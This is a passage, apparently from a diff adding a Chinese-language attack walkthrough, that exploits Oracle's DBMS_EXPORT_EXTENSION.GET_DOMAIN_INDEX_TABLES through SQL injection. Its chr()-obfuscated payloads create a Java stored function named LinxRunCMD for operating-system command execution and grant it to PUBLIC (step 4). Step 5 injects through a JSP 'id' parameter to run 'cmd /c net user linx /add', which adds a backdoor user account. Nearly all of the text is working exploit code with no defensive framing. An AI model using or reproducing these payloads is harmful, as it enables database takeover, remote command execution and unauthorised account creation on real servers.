+chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||chr(114)||chr(101)||chr(112)||chr(108)||chr(97)||
+chr(99)||chr(101)||chr(32)||chr(102)||chr(117)||chr(110)||chr(99)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(82)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(112)||chr(95)||chr(99)||chr(109)||chr(100)||chr(32)||chr(105)||
+chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(41)||chr(32)||chr(32)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(32)||chr(32)||
+chr(97)||chr(115)||chr(32)||chr(108)||chr(97)||chr(110)||chr(103)||chr(117)||chr(97)||chr(103)||chr(101)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(32)||chr(110)||chr(97)||chr(109)||chr(101)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(76)||chr(105)||chr(110)||chr(120)||
+chr(85)||chr(116)||chr(105)||chr(108)||chr(46)||chr(114)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(108)||chr(97)||chr(110)||chr(103)||chr(46)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(41)||chr(32)||
+chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(39)||chr(39)||chr(39)||chr(39)||chr(59)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||
+chr(59)||chr(45)||chr(45)
+,chr(83)||chr(89)||chr(83),0,chr(49),0) from dual
+
+
+
+4.赋public执行函数的权限
+
+select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
+chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
+chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||
+chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
+chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(103)||chr(114)||chr(97)||chr(110)||chr(116)||chr(32)||chr(97)||chr(108)||chr(108)||chr(32)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||
+chr(110)||chr(120)||chr(82)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(32)||chr(116)||chr(111)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||
+chr(59)||chr(45)||chr(45)
+,chr(83)||chr(89)||chr(83),0,chr(49),0) from dual
+
+
+
+5.执行命令：
+
+/xxx.jsp?id=1 and chr(49)<>chr(32)||(
+select sys.LinxRunCMD('cmd /c net user linx /add') from dual
+)
+
+即
+/xxx.jsp?id=1 and chr(49)<>chr(32)||(
+select sys.LinxRunCMD(chr(99)||chr(109)||chr(100)||chr(32)||chr(47)||chr(99)||chr(32)||chr(110)||chr(101)||chr(116)||chr(32)||chr(117)||chr(115)||chr(101)||chr(114)||chr(32)||chr(108)||chr(105)||chr(110)||chr(120)||chr(32)||chr(47)||chr(97)||chr(100)||chr(100)) from dual
+)
